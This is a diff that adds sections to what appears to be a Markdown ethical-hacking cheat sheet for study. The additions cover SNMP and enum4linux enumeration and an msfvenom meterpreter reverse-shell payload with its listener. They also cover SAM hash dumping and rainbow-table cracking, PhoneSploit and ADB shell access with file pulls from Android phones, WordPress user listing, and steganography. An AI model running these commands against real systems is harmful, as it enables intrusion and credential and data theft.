@@ -80,6 +80,13 @@ http.request.method == GET
 # Sort by packets in IPv4 based on number of the packets transfer
 Statistics > Conversations > IPv4 > Packets
 ```
+
+* Detect ARP Poisoning
+
+```shell
+Open Wireshark > Edit > Preferences > Protocols > ARP/RARP > Detect ARP Request Storms > Detect duplicate IP address > Start Capture > Analyze Expert information
+```
+
 </details>
 
 <details>
@@ -132,25 +139,145 @@ john SMBfilename
 ```
 </details>
 
-# System Hacking
+# Enumeration
+
+</details>
 
 <details>
-<summary>Hacking Tool</summary>
+<summary>SNMP Enumeration</summary>
 
-## Hacking Tool
+## SNMP Enumeration
 
-* Add a brief description.
+* Performing SNMP Enumeration
+
+```shell
+# Scanning the port
+nmap -sU -p 161 <TARGET_IP>
+
+# Brute forcing SNMP
+nmap -sU -p 161 --script=snmp-brute <TARGET_IP>
+
+# Metasploit Modules
+use auxiliary/scanner/snmp/snmp_login | set RHOSTS | exploit
+use auxiliary/scanner/snmp/snmp_enum | set RHOSTS | exploit
+```
+</details>
+
+</details>
+
+<details>
+<summary>Enum4Linux</summary>
+
+## Enum4Linux
+
+* Performing Linux Enumeration.
+
+```shell
+Enum4linux [options] IP
+enum4linux -u username -p password -U 10.10.10.12 | - u user -p pass -U get user list
+enum4linux -u username -p password -o 10.10.10.12 | -o get OS info
+enum4linux -u username -p password -P 10.10.10.12 | -P get password policy info
+enum4linux -u username -p password -G 10.10.10.12 | -G get groups and members info
+enum4linux -u username -p password -S 10.10.10.12 | -S get share list info
+enum4linux -u username -p password -a 10.10.10.12 | -a get all simple enumeration data [-U -S -G -P -r -o -n -i]
+```
+</details>
+
+# System Hacking
+
+</details>
+
+<details>
+<summary>MSFVenom</summary>
+
+## MSFVenom
+
+* Creating a payload
 
 ```console
-# And some code
-whoami
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=attacker_IP LPORT=attacker_Port -o filename.exe
+```
+
+* Creating a reverse connection
+
+```console
+msfdb init && msfconsole 
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST = attacker-IP  
+set LPORT = attacker-Port 
+run
+```
+
+</details>
+
+<details>
+<summary>Dumping SAM Hashes</summary>
+
+## Dumping SAM Hashes
+
+* Windows stores passwords in LM and NTLM hash formats. You need admin level access to dump them.
+
+```powershell
+wmic useraccount get name,sid
+```
+
+* You can use Pwdump7 to dump the password hashes.
+
+```powershell
+# dumps a protected file
+pwdump7.exe -d C:\lockedfile.dat backup-lockedfile.dat
+
+# show password hashes
+pwdump.exe
+
+# export hashes to the path defined
+Pwdump7.exe > C:\hashes.txt
+```
+
+</details>
+
+<details>
+<summary>OPHCrack</summary>
+
+## OPHCrack
+
+* Cracks passwords no longer than 14 characters using only alphanumeric characters.
+
+```shell
+Open x86 GUI Version > Load PWDUMP > Select the hashes.txt file > Vista Free > Install it where OPHCrack files are placed
 ```
 </details>
 
 <details>
-<summary>Hacking Tool</summary>
+<summary>Winrtgen</summary>
 
-## Hacking Tool
+## Winrtgen
+
+* Creates Rainbow Tables.
+
+```shell
+Add Table > Hash NTLM > Min Length 4 > Max Length 6 > Chain Count 4000000 > CharSet LowerAlpha > Click Ok to start > Table is saved in Winrtgen folder
+```
+</details>
+
+<details>
+<summary>Rainbow Crack</summary>
+
+## Rainbow Crack
+
+* Cracking NTLM Hashes.
+
+```shell
+Open rcrack_gui.exe > File > Load NTLM Hashes from PWDUMP > Open Hashes.txt
+Rainbow Table > Select Rainbow Table > Select Table created by Winrtgen > Crack
+```
+</details>
+
+<details>
+<summary>L0phtCrack</summary>
+
+## L0phtCrack
 
 * Add a brief description.
 
@@ -163,29 +290,75 @@ whoami
 # Android Hacking
 
 <details>
-<summary>Hacking Tool</summary>
+<summary>Phonesploit</summary>
 
-## Hacking Tool
+## Phonesploit
 
-* Add a brief description.
+* Installing Phonesploit.
 
-```console
-# And some code
-whoami
+```shell
+git clone https://github.com/aerosol-can/PhoneSploit
+cd PhoneSploit
+pip3 install colorama
+
+# Alternative
+python3 -m pip install colorama
 ```
+
+* Running Phonesploit.
+
+```shell
+python3 phonesploit.py
+```
+
+* To establish a connection with a new phone, choose option 3 and press Enter. Alternatively, you can enter the IP of the Android device.
+* Then choose option 4 to access shell on the phone
+* Download desired files using option 9
+
+```shell
+sdcard/Download/secret.txt
+```
+
 </details>
 
 <details>
-<summary>Hacking Tool</summary>
+<summary>ADB</summary>
 
-## Hacking Tool
+## ADB
 
-* Add a brief description.
+* Installing ADB
 
 ```console
-# And some code
-whoami
+apt-get update
+sudo apt-get install adb -y
+adb devices -l
 ```
+
+* Establishing a connection
+
+```console
+adb connect IP_ADDRESS:5555
+adb devices -l
+adb shell  
+```
+
+* Navigation
+
+```console
+pwd
+ls
+cd Download
+ls
+cd sdcard
+```
+
+* Download a file from an Android device using ADB
+
+```console
+adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
+adb pull sdcard/log.txt /home/mmurphy/Desktop
+```
+
 </details>
 
 # Password Cracking
@@ -241,6 +414,18 @@ You can use NSLookup to find the IP Address of a website.
 
 ```console
 nslookup www.example.com
+```
+</details>
+
+<details>
+<summary>WordPress</summary>
+
+## WordPress
+
+* List WordPress users using the public default REST API.
+
+```consoole
+https://wordpress-site.com/wp-json/wp/v2/users/
 ```
 </details>
 
@@ -432,6 +617,31 @@ snow.exe -c -p test -m "Secret Message" original.txt hide.txt
 ```console
 snow.exe -c -p test hide.txt
 ```
+
+</details>
+
+</details>
+
+<details>
+<summary>OpenStego</summary>
+
+## OpenStego
+
+Perform image steganography. To hide data, follow the next steps.
+
+* Select text message file which you want to hide
+* Select the cover file image where data is to be hidden
+* Set output path and file name
+* Set password if needed
+* Click Hide Data
+
+To extract data
+
+* Open the steganography file.
+* Set the output folder path
+* Enter the password
+* Extract Data
+
 
 </details>
 
